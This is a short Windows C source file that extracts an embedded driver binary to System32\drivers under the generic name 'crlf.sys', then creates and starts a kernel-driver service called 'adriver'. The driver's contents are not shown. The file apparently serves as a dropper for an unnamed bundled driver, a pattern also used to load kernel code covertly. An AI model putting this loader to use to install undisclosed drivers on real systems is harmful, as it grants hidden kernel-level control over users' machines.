#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>
#include <stdbool.h>
#include <tchar.h>
#include "DriverData.h"

// Define the path where the driver will be extracted
//LPCWSTR serviceName = L"aadriver";
//LPCWSTR driverPath = L"C:\\Windows\\System32\\drivers\\magenta.sys";

LPCWSTR serviceName = L"adriver";
LPCWSTR driverPath = L"C:\\Windows\\System32\\drivers\\crlf.sys";

// Function to write rawData to a file
bool writeDriverFile(const wchar_t* filePath, const unsigned char* data, size_t dataSize) {
    FILE* file = _wfopen(filePath, L"wb");
    if (!file) {
        // wprintf(L"Failed to open file for writing: %s\n", filePath);
        return false;
    }
    fwrite(data, 1, dataSize, file);
    fclose(file);
    return true;
}

bool driver_init() {
    SC_HANDLE hSCManager = NULL;
    SC_HANDLE hService = NULL;
    bool result = false;

    // Check if the driver file exists, if not, write it
    if (GetFileAttributesW(driverPath) == INVALID_FILE_ATTRIBUTES) {
        if (!writeDriverFile(driverPath, rawData, sizeof(rawData))) {
            wprintf(L"Failed to write driver file.\n");
            return false;
        }
    }

    // Open a handle to the service control manager
    hSCManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (hSCManager == NULL) {
        // wprintf(L"OpenSCManager failed: %lu\n", GetLastError());
        return false;
    }

    // Open the service
    hService = OpenServiceW(hSCManager, serviceName, SERVICE_ALL_ACCESS);

    if (hService == NULL) {
        // If the service does not exist, create it
// before: SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START
        hService = CreateServiceW(
            hSCManager,
            serviceName,
            serviceName,
            SERVICE_ALL_ACCESS,
            SERVICE_KERNEL_DRIVER,
            SERVICE_DEMAND_START,
            SERVICE_ERROR_NORMAL,
            driverPath,
            NULL,
            NULL,
            NULL,
            NULL,
            NULL
        );

        if (hService == NULL) {
            wprintf(L"CreateService failed: %lu\n", GetLastError());
            CloseServiceHandle(hSCManager);
            return false;
        }
    }

    // Start the service if it is not already running
    SERVICE_STATUS_PROCESS ssp = { 0 };
    DWORD bytesNeeded;
    if (QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(SERVICE_STATUS_PROCESS), &bytesNeeded)) {
        if (ssp.dwCurrentState != SERVICE_RUNNING) {
            if (StartServiceW(hService, 0, NULL)) {
                wprintf(L"Service started successfully.\n");
                result = true;
            }
            else {
                wprintf(L"StartService failed: %lu\n", GetLastError());
            }
        }
        else {
            wprintf(L"Service is already running.\n");
            result = true;
        }
    }
    else {
        wprintf(L"QueryServiceStatusEx failed: %lu\n", GetLastError());
    }

    // Clean up
    if (hService) CloseServiceHandle(hService);
    if (hSCManager) CloseServiceHandle(hSCManager);

    return result;
}
